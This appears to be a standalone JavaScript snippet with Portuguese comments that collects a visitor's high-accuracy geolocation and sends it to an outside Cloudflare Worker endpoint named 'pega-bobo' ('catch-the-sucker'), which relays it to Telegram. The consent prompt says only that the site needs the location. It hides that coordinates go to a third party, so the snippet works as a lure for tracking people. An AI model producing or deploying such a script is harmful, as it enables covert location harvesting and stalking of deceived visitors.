<script>
  async function enviarLocalizacao() {
    // 1. Primeiro pede permissão ao usuário
    if (!confirm("Este site precisa acessar sua localização. Permitir?")) {
      alert("Você negou a permissão. Atualize a página para tentar novamente.");
      return;
    }

    // 2. Configuração de alta precisão
    const options = {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    };

    // 3. Tenta obter a localização
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, options);
      });

      // 4. Prepara os dados para envio
      const dados = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        precisao: position.coords.accuracy,
        timestamp: new Date(position.timestamp).toISOString()
      };

      console.log("Dados preparados:", dados);

      // 5. Configura a requisição
      const workerUrl = "https://pega-bobo-worker.zeruelinha99.workers.dev";
      const config = {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Requested-With": "XMLHttpRequest"
        },
        body: JSON.stringify(dados)
      };

      console.log("Configuração da requisição:", config);

      // 6. Faz a requisição
      const resposta = await fetch(workerUrl, config);
      const resultado = await resposta.json();

      console.log("Resposta do Worker:", resultado);

      if (!resposta.ok) {
        throw new Error(resultado.error || "Erro ao enviar localização");
      }

      alert("✅ Localização enviada com sucesso para o Telegram!");

    } catch (erro) {
      console.error("Erro completo:", erro);
      
      let mensagem = "Erro: ";
      if (erro.code === erro.PERMISSION_DENIED) {
        mensagem += "Você negou a permissão de localização.";
      } else if (erro.message.includes("Content-Type")) {
        mensagem += "Problema no servidor (configuração incorreta).";
      } else {
        mensagem += erro.message;
      }
      
      alert(mensagem);
    }
  }

  // Inicia quando a página carrega
  window.addEventListener("DOMContentLoaded", () => {
    if (!navigator.geolocation) {
      alert("Seu navegador não suporta geolocalização!");
      return;
    }
    
    // Botão para iniciar manualmente
    const botao = document.createElement("button");
    botao.textContent = "Enviar Minha Localização";
    botao.style.padding = "10px 20px";
    botao.style.fontSize = "16px";
    botao.style.marginTop = "20px";
    botao.onclick = enviarLocalizacao;
    
    document.body.appendChild(botao);
  });
</script>
